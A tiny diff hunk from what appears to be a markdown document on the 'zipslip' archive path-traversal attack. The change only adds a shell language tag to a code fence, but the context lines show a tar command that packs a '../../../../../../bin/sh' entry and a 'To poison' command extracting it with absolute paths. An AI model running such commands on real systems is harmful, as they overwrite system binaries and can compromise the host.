@@ -21,7 +21,7 @@ tar cPf zipslip.tar ../../../../../../bin/sh
 ```
 
 To poison:
-```
+```sh
 tar xPf zipslip.tar
 ```
 
